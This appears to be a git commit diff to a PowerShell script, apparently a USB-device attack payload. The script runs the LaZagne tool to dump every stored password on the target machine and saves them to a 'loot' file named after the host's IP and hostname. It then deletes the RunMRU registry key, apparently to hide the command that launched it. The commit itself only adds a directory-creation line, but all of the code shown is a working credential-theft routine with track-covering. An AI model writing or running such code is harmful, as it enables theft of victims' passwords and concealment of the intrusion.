fab7a491c1772dfaddae50f44c1ed5ca3b57ca8a
kuyaya <alois.kuyaya@gmx.ch>
2020-02-11 08:20:51 +0100

    fixed mkdir issue

--- lazassword.ps1
+++ lazassword.ps1
@@ -4,6 +4,7 @@ Expand-Archive -Force $BLABEL\lazagne.zip $BLABEL\lazagne
 $LPATH = & $BLABEL\lazagne\lazagne.exe all -vv
 $ipV4 = Test-Connection -ComputerName (hostname) -Count 1  | Select IPV4Address
 $tar_hostname = hostname
+mkdir $BLABEL\loot\LaZassword
 $LOOTFILE = "$BLABEL\loot\LaZassword\$ipV4$tar_hostname.txt"
 $LPATH | Out-File -FilePath $LOOTFILE
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
